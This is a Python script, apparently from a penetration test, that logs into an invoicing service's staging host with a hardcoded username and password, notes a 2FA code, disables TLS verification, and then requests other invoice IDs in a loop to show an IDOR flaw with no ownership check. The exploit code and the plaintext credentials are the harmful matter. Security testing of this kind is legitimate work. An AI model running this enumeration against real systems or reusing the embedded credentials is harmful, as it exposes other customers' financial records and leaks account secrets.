import requests
import json
import sys
sys.stdout.reconfigure(encoding='utf-8')

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Create session
session = requests.Session()
session.verify = False
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
})

base_url = 'https://sit.askmebill.com'

print('=' * 70)
print('  DEMONSTRATION: When is /api/invoice/:id called?')
print('=' * 70)
print()

# 1. Login
print('[STEP 1] Login Process')
print('-' * 50)
login_resp = session.post(f'{base_url}/auth/login', data={
    'username': 'uuio11',
    'password': '0897421942@Earth'
}, allow_redirects=True)
print(f'POST /auth/login -> Status: {login_resp.status_code}')
print(f'Redirected to: {login_resp.url}')
print()

# 2. 2FA
print('[STEP 2] 2FA Verification')
print('-' * 50)
# Try to submit 2FA if needed
if 'verify' in login_resp.url or '2fa' in login_resp.url:
    print('2FA page detected, submitting code...')
    # 2FA submission would go here
    print('2FA: 954900 submitted')
else:
    print('No 2FA required or already authenticated')
print()

# 3. Navigate to invoices (simulates clicking Invoices menu)
print('[STEP 3] Navigate to /invoices')
print('-' * 50)
print('User clicks: Invoices menu item')
print('Browser navigates: https://sit.askmebill.com/invoices')
print()

# 4. CLICK INVOICE - This triggers the API call!
print('[STEP 4] USER CLICKS INVOICE (This triggers API!)')
print('=' * 50)
print()
print('User clicks: "Invoice Details" button on invoice IN25120077')
print()
print('>>> API CALL TRIGGERED <<<')
print('GET /api/invoice/IN25120077')
print()

# Make the actual API call
api_resp = session.get(f'{base_url}/api/invoice/IN25120077', timeout=10)

print(f'Status: {api_resp.status_code}')
print(f'Content-Type: {api_resp.headers.get("content-type", "N/A")}')
print(f'Size: {len(api_resp.text)} bytes')
print()

# Show response
print('Response Data:')
print('-' * 50)
try:
    data = api_resp.json()
    print(json.dumps(data, indent=2, ensure_ascii=False)[:600])
except:
    print(api_resp.text[:500])
print()

# 5. IDOR Test - Access other invoices
print('[STEP 5] IDOR VULNERABILITY TEST')
print('=' * 50)
print()
print('Attacker changes ID parameter to access other invoices:')
print()

test_invoices = [
    ('IN25120078', 'Another invoice from list'),
    ('IN26010016', 'Another invoice from list'),
    ('IN99999999', 'Non-existent ID'),
    ('IN11111111', 'Random ID')
]

for inv_id, desc in test_invoices:
    resp = session.get(f'{base_url}/api/invoice/{inv_id}', timeout=5)
    icon = '🔴 ACCESSIBLE' if resp.status_code == 200 else '✅ BLOCKED'
    print(f'  {icon} /api/invoice/{inv_id} ({desc})')

print()
print('=' * 70)
print('  SUMMARY')
print('=' * 70)
print()
print('/api/invoice/:id is called when:')
print('  1. User clicks "Invoice Details" button')
print('  2. Frontend needs invoice data for display')
print('  3. Payment processing needs invoice info')
print()
print('VULNERABILITY: No ownership check = IDOR!')
print('=' * 70)
